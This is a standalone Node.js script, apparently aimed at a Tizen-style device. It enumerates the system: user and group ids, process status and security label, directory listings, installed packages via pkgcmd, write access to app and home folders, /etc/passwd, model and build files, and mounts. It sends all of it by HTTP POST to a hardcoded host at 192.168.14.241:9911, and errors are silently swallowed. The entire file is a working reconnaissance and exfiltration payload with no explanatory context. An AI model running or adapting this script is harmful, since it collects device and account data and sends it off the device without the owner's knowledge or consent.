var http = require('http');
var fs = require('fs');
var cp = require('child_process');
function report(msg){
  var data = JSON.stringify(msg);
  var req = http.request({host:'192.168.14.241', port:9911, path:'/report', method:'POST',
    headers:{'Content-Type':'application/json','Content-Length':Buffer.byteLength(data)}}, function(){});
  req.on('error', function(){});
  req.write(data); req.end();
}
function readf(p, n){ try { return fs.readFileSync(p, 'utf8').slice(0, n||600); } catch(e){ return 'ERR '+e.code; } }
function ls(p){ try { return fs.readdirSync(p).slice(0, 60).join(','); } catch(e){ return 'ERR '+e.code; } }
function tryexec(file, args){
  try { return cp.spawnSync(file, args, {timeout: 6000}).stdout.toString().slice(0, 2500); }
  catch(e){ return 'ERR '+(e.code||e.message); }
}
function wt(p){ try { fs.writeFileSync(p+'/.__wtest', 'x'); fs.unlinkSync(p+'/.__wtest'); return 'RW'; } catch(e){ return 'RO/'+e.code; } }
var out = {};
out.uid = (typeof process.getuid === 'function') ? process.getuid() : 'n/a';
out.gid = (typeof process.getgid === 'function') ? process.getgid() : 'n/a';
out.self_status = readf('/proc/self/status', 900);
out.smack = readf('/proc/self/attr/current');
out.proc1_cmdline = readf('/proc/1/cmdline', 400);
out.ls_root = ls('/');
out.ls_etc = ls('/etc');
out.ls_opt_etc = ls('/opt/etc');
out.ls_apps = ls('/opt/usr/apps');
out.ls_owner_share = ls('/home/owner/share');
out.exec_ls = tryexec('/bin/ls', ['-la', '/']);
out.exec_id = tryexec('/usr/bin/id', []);
out.exec_pkgcmd = tryexec('/usr/bin/pkgcmd', ['-l']);
out.w_home = wt('/home/owner/share');
out.w_tmp = wt('/tmp');
out.w_apps = wt('/opt/usr/apps/xvvl3S1bvH');
out.read_passwd = readf('/etc/passwd', 900);
out.read_osrelease = readf('/etc/os-release', 300);
out.read_host_info = readf('/etc/info/Debug', 300);
out.read_model = readf('/etc/.model', 200);
out.read_build = readf('/etc/build', 200);
out.read_applist = readf('/opt/usr/apps/.info', 300);
out.cpuinfo = readf('/proc/cpuinfo', 800);
out.mounts = readf('/proc/mounts', 1400);
report(out);
